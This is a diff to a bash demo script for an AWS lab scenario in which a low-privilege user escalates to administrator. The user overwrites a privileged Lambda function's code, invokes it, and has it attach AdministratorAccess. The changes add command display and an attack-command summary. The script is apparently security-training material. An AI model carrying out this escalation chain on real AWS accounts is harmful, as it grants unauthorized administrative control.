@@ -5,7 +5,9 @@
 # can modify existing Lambda function code and manually invoke it to execute malicious logic
 # under the function's privileged role and gain admin access
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -13,6 +15,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-lambda-004-to-admin-starting-user"
@@ -71,6 +91,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -82,6 +103,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -89,6 +111,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -101,6 +124,7 @@ echo -e "${YELLOW}Step 5: Discovering target Lambda function${NC}"
 echo "Target Lambda function: $TARGET_LAMBDA"
 
 # Get function details
+show_cmd "aws lambda get-function --region $AWS_REGION --function-name $TARGET_LAMBDA --output json"
 FUNCTION_INFO=$(aws lambda get-function \
     --region $AWS_REGION \
     --function-name $TARGET_LAMBDA \
@@ -219,6 +243,7 @@ echo "Function: $TARGET_LAMBDA"
 echo ""
 echo "Executing: aws lambda update-function-code --function-name $TARGET_LAMBDA"
 
+show_attack_cmd "aws lambda update-function-code --region $AWS_REGION --function-name $TARGET_LAMBDA --zip-file fileb:///tmp/lambda_function.zip --output json"
 UPDATE_RESULT=$(aws lambda update-function-code \
     --region $AWS_REGION \
     --function-name $TARGET_LAMBDA \
@@ -253,6 +278,7 @@ echo "By invoking the function, our malicious code executes with the Lambda's ad
 echo ""
 echo "Executing: aws lambda invoke --function-name $TARGET_LAMBDA"
 
+show_attack_cmd "aws lambda invoke --region $AWS_REGION --function-name $TARGET_LAMBDA --payload '{}' /tmp/response.json --output json"
 aws lambda invoke \
     --region $AWS_REGION \
     --function-name $TARGET_LAMBDA \
@@ -283,6 +309,7 @@ echo -e "${YELLOW}Step 13: Verifying administrator access${NC}"
 echo "Attempting to list IAM users with our original credentials..."
 echo ""
 
+show_cmd "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo ""
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
@@ -316,6 +343,13 @@ echo -e "  → (lambda:InvokeFunction) → Execute modified function"
 echo -e "  → Function runs as $TARGET_ROLE"
 echo -e "  → (iam:AttachUserPolicy) → Attach AdministratorAccess"
 echo -e "  → Admin privileges obtained"
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
 
 echo -e "\n${YELLOW}Why This Works:${NC}"
 echo "- lambda:UpdateFunctionCode allows modifying the function's code"
